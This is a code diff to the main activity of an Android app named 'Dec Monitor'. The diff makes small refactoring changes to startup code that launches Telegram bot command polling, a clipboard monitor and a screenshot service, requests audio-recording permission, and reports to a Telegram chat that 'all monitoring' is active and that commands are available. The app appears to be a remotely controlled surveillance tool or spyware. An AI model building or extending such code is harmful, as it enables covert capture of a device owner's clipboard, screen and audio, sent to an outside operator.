@@ -9,6 +9,9 @@ import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import com.dec.monitor.input.ClipboardMonitor
 import com.dec.monitor.screen.ScreenshotService
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 
 class MainActivity : AppCompatActivity() {
 
@@ -18,11 +21,9 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        // start command polling
         TelegramBot.startPolling(applicationContext)
-
-        // start clipboard monitor
         ClipboardMonitor.start(applicationContext)
+        TelegramBot.appContext = applicationContext
 
         requestPermissions(arrayOf(
             android.Manifest.permission.RECORD_AUDIO,
@@ -43,8 +44,6 @@ class MainActivity : AppCompatActivity() {
         }
 
         findViewById<TextView>(R.id.tvStatus).text = "Dec Monitor active.\nTap Start to enable screen capture."
-
-        TelegramBot.appContext = applicationContext
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
@@ -56,7 +55,7 @@ class MainActivity : AppCompatActivity() {
             }
             startForegroundService(serviceIntent)
             findViewById<TextView>(R.id.tvStatus).text = "✅ All monitoring active."
-            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+            CoroutineScope(Dispatchers.IO).launch {
                 TelegramBot.sendMessage("✅ <b>Dec Monitor fully active.</b>\nSend /help for commands.")
             }
         }
